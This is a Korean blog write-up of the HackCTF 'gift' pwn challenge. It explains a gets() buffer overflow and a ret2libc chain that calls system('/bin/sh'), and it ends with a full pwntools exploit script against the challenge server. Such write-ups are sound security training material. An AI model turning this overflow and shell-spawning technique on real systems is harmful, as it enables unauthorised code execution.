---
layout: post
title:  "HackCTF gift write-up"
date:   2020-02-03 19:45:55
image:  hackctf_gift.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20gift/Untitled.png)

NX비트 말곤 다 안걸려있다.
<br><br>
**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20gift/Untitled%201.png)

바이너리를 실행시켜보면 두개의 주소를 알려주고 두개의 입력을 받고 종료가 된다. 해당 주소를 이용하여 진행을 하는것으로 보인다
<br><br>
**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20gift/Untitled%202.png)

출력되는 주소가 binsh의 주소와 system함수의 주소이다. 그리고 fgets로 128바이트 만큼 입력을 받고, 입력한 문자열을 출력해준 뒤, gets로 한번더 입력을 받게 된다. 여기서는 크기 제한이 없으므로 bof를 일으켜 ret를 변경하여 system함수를 실행시키면 될 것이다
<br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20gift/Untitled%203.png)

하지만 자세히 보면 system 함수는 실제 함수의 주소이지만, binsh는 .bss 영역에 저장된 전역변수의 이름이 binsh이다. 해당 주소를 rop의 인자로 넣으면 아무 소용이 없다. 이를 염두해야한다
<br><br><br><br>
### 2. 접근방법

---

system함수를 주기 때문에 libc_base를 구하여 오프셋을 이용해 "/bin/sh" 의 주소를 찾고 ROP를 진행하면 될 것이다. 매우 간단한 문제이다. libc_database를 이용하여 libc의 버전을 확인해보자
<br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20gift/Untitled%204.png)

ubuntu10의 2.23 버전이다. 현재 내 환경은 ubuntu16이기 때문에 로컬에서는 될지 몰라도 원격에서는 오프셋이 다르기 때문에 ubuntu10에서의 오프셋을 구해야한다. dump 프로그램을 이용하자
<br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20gift/Untitled%205.png)

system함수와 bin_sh의 오프셋을 확인가능하다. 이를 이용하여 ROP를 진행하자
<br><br><br>
### 3. 풀이

---

최종 익스코드는 다음과 같다
```python
from pwn import *
context.log_level="DEBUG"
p=remote("ctf.j0n9hyun.xyz",3018)
#p=process("./gift")
#gdb.attach(p)

tmp=p.recvline()
bin_bash=int(tmp[32:41],16)
system_addr=int(tmp[42:],16)

log.info("bin::"+hex(bin_bash))
log.info("system::"+hex(system_addr))

libc_base=system_addr-0x0003a940
gets_adr=libc_base+0x5f3e0

p.sendline("A")
#p.recvline()

payload="A"*0x88+p32(system_addr)
payload+=p32(0x080483ad)
payload+=p32(libc_base+0x15902b)
#payload+=p32(system_addr)
#payload+="AAAA"
#payload+=p32(bin_bash)


p.sendline(payload)
#p.sendline("/bin/sh\00")

p.interactive()
```

<br><br><br>
### 4. 몰랐던 개념

---

처음에 libc_databe의 우분투 버전을 제대로 확인하지 않아서 계속 시간낭비를 했다. 주어진 문제의 조건들을 잘 확인하자..